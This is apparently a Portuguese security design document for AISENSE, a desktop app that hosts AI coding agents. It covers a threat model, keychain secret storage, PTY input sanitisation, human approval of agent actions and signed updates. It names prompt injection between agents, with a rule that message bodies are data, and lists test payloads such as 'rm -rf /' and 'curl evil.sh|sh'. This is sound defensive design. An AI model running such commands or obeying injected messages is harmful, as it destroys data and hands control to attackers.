# 11 — Segurança

> O AISENSE executa processos arbitrários com as permissões do usuário e abre um socket local que
> esses processos usam. A superfície é pequena, mas precisa ser tratada com seriedade.

## Modelo de ameaça

| Ator | Pode | Mitigação |
|---|---|---|
| Processo local de outro usuário | Tentar conectar no socket do barramento | Socket `0600`; named pipe com DACL restrita ao SID do usuário |
| Processo local do **mesmo** usuário | Conectar no socket | Exige `AISENSE_TOKEN` válido; tokens são por sessão e expiram. Aceito como limite: quem já roda como você já pode ler seus arquivos |
| Agente de IA comprometido / alucinando | Enviar mensagens maliciosas a outros agentes | Sanitização de corpo, limites de taxa, tudo visível na timeline |
| Conteúdo vindo da rede (a IA leu uma página) | Tentar injeção de prompt via mensagem entre agentes | Mensagens sempre rotuladas com remetente; a skill orienta a tratar corpo como **dado, não instrução** |
| Skill importada de terceiro | Conter instruções hostis | Preview obrigatório antes de importar; skills não executam nada sozinhas |

## Segredos

- Chaves de API vão no **keychain do SO** via crate `keyring` (Keychain no macOS,
  Credential Manager no Windows, Secret Service no Linux).
- **Nunca** em `aisense.db`, `settings.json` ou log. O `settings.json` guarda só o runtime, o
  nome da variável e a forma mascarada; a entrada do keychain é `dev.aisense.app` /
  `<runtime>/<VARIÁVEL>`. No Linux o `keyring` fala com o Secret Service em Rust puro
  (`async-secret-service` + `crypto-rust`), sem exigir libdbus; sem Secret Service rodando, gravar
  falha com a explicação — o valor nunca cai em disco como alternativa.
- Injetadas no PTY apenas no spawn, apenas para o agente que precisa.
- A UI mostra `sk-…abcd` (mascarado) e nunca permite copiar o valor de volta.
- `AISENSE_TOKEN` não é segredo de longa duração: dura a sessão do agente e é apagado no fim.

## Sanitização de mensagens injetadas no PTY

Escrever no stdin de um terminal é escrever em algo que interpreta sequências de controle.
Antes de qualquer injeção (modo `push`):

1. Remover `\x1b` (ESC), `\x07` (BEL), `\x9b` (CSI) e todos os controles C0 exceto `\t`.
2. Normalizar `\r\n` e `\r` para espaço — **o `\r` de submissão é adicionado pelo AISENSE**,
   nunca vem do corpo da mensagem. Sem isso, uma mensagem com quebra de linha executaria comandos.
3. Limitar a `inject.max_chars`; acima disso, gravar em arquivo e injetar só o caminho.
4. Prefixar com `[AISENSE] Mensagem de @remetente:` — o agente sempre sabe que é mensagem, não ordem sua.

Há teste obrigatório em `aisense-core::delivery::sanitize` com corpus de payloads maliciosos
(`"; rm -rf /"`, `"\r\ncurl evil.sh|sh"`, escape ANSI, OSC 8, etc.).

## Autonomia por agente

| Nível | Significado |
|---|---|
| `ask` (padrão) | O runtime pede confirmação para ações destrutivas, com o comportamento padrão dele |
| `trusted` | Flags de auto-aprovação do runtime são passadas (ex.: modo sem confirmação) |

`trusted` exige confirmação explícita ao ativar, com aviso claro e em texto direto sobre o que muda.
Nunca é o padrão, nunca é ativado por modelo de equipe.

## Permissões do Tauri

Allowlist mínima. Habilitado: diálogo de arquivo, shell **apenas** para os sidecars declarados,
sistema de arquivos restrito a `~/.aisense` e ao workdir da equipe, clipboard, notificações.
Desabilitado: `shell.open` genérico, `http` (o front não faz requisição nenhuma), `process.exit` global.
CSP restritiva, sem `unsafe-eval`, sem origem externa.

## Comandos do barramento que exigem confirmação humana

Nenhum agente pode, sozinho:
- criar, apagar ou reconfigurar outro agente;
- mudar o nível de autonomia de qualquer agente;
- editar skills;
- ler ou escrever fora do workdir da equipe através do AISENSE.

O agente `@coordenador` **propõe** ("sugiro criar um `@qa`") e a UI mostra a proposta com
[Aceitar] / [Recusar]. Isso é deliberado: agente que cria agente é como recursão sem caso base.

Como funciona (F07-02): `aisense propose agent|autonomy|skill|columns ... --reason "..."` (MCP:
`aisense_propose`) grava a proposta (tabela `proposals`) e responde com o erro `needs_approval` —
a ação não acontece. Não existe operação do barramento que crie agente, mude autonomia, edite skill
ou mexa em colunas: o único caminho é a proposta. Aceitar executa criar agente e mudar autonomia;
em skill e colunas registra que você concorda e vai editar. Quem propôs recebe a decisão como
mensagem de sistema.

## Atualizações

Auto-update assinado (Tauri updater) com chave mantida fora do repositório.
Verificação de assinatura obrigatória. Usuário pode desligar.

Como funciona (F09-03, `commands/updates.rs`):

- A chave **pública** entra na config do app no build de release (segredo
  `AISENSE_UPDATER_PUBKEY`); a privada só existe nos segredos do GitHub (`docs/distribuicao.md`).
  Build sem a chave (o de desenvolvimento) não faz requisição nenhuma e diz isso na tela.
- Canal estável: `releases/latest/download/latest.json` no GitHub, só HTTPS. Pre-releases (tag com
  hífen) ficam fora do `/latest`.
- O pacote baixado tem a assinatura minisign conferida contra a chave compilada **antes** de
  instalar; assinatura inválida para tudo sem mexer na instalação. Nada é instalado sem o clique em
  "Instalar e reiniciar".
- Antes de instalar, o app guarda quem estava rodando, para os agentes e o barramento
  (`commands::shutdown`, o mesmo do fechar da janela) — no Windows o instalador fecha o app.
- **Desligar** (Configurações → Avançado → "Procurar atualizações ao abrir") elimina a única
  requisição de rede do app; "Procurar agora" continua disponível.
- O `latest.json` em si não é assinado: quem controlasse a resposta HTTPS poderia anunciar uma
  versão nova apontando para o pacote (legitimamente assinado) de uma **antiga**. Por isso
  `requireSignedVersion` está ligado: a assinatura que o bundler gera traz `version:<v>` no
  comentário confiável (conferido no `.sig` do `.deb`), e o plugin recusa o pacote cuja versão
  assinada não é a anunciada.
- A chave pública mora em `plugins.updater.pubkey`, gravada no build de release por
  `scripts/release-config.mjs` a partir do segredo; o `tauri.conf.json` versionado a deixa vazia.

## Privacidade

- Nenhuma telemetria por padrão (ver D5 em [ESTADO.md](ESTADO.md)).
- Nenhuma requisição de rede feita pelo AISENSE além da checagem de atualização (desligável em
  Configurações → Avançado).
- O que a CLI de IA faz com a rede é responsabilidade dela; o app apenas a hospeda.
- "Exportar diagnóstico" gera um `.zip` com logs **redigidos** (tokens e caminhos de home mascarados)
  e mostra o conteúdo antes de salvar. Como funciona (F09-05, `aisense-core::diagnostics`): o
  pacote tem `relatorio.json` (versão, SO, preferências sem a lista de segredos, runtimes
  detectados, adaptadores com problema) e o fim (1 MB) do log do app desta execução e da anterior
  (`logs/aisense-app.log` e `.1`). A redação troca por `‹redigido›`: os valores exatos guardados no
  keychain; valores de nomes que dizem segredo (`*_API_KEY=`, `token:`, `"password": "…"`);
  formatos que se reconhecem sozinhos (`sk-…`, `ghp_…`, `github_pat_…`, `xox?-…`, `AKIA…`,
  `AIza…`, JWT, `Bearer …`, 64 hex do `AISENSE_TOKEN`); e a pasta home vira `~`. Transcrições dos
  terminais, banco, notas e skills **não** entram, e a prévia diz isso. O `.zip` salvo é o mesmo
  da prévia, byte a byte.
